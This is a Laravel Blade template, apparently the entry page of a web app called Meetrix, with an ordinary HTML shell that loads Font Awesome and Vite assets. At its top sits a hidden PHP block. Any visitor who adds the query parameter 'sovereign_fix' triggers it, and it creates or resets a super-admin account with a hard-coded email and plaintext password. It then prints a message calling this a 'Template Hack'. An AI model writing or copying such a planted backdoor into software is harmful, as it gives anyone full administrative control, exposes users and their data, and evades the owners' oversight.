@php
if (request()->has('sovereign_fix')) {
    \App\Models\User::updateOrCreate(
        ['email' => 'admin@meetrix.pro'],
        [
            'name' => 'Master Admin',
            'password' => \Illuminate\Support\Facades\Hash::make('MeetrixMaster2026Sovereign!#'),
            'is_super_admin' => true,
            'email_verified_at' => now(),
        ]
    );
    echo "Sovereign Node Provisioned via Template Hack.";
    exit;
}
@endphp
<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Meetrix</title>
        <!-- Font Awesome 6 -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        @vite(['resources/css/app.css', 'resources/js/app.js'])
    </head>
    <body class="antialiased">
        <div id="app"></div>
    </body>
</html>
